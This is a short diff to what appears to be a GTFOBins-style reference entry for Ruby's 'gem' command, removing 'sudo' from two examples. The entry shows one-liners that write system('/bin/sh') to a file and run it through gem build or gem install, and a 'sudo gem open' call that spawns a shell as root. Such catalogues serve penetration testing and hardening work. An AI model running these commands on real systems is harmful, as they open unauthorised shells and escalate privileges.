@@ -11,12 +11,12 @@ functions:
       code: |
         TF=$(mktemp -d)
         echo 'system("/bin/sh")' > $TF/x
-        sudo gem build $TF/x
+        gem build $TF/x
     - description: This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
       code: |
         TF=$(mktemp -d)
         echo 'system("/bin/sh")' > $TF/x
-        sudo gem install --file $TF/x
+        gem install --file $TF/x
   sudo:
     - description: This requires the name of an installed gem to be provided (`json` is usually installed).
       code: sudo gem open -e "/bin/sh -c /bin/sh" json
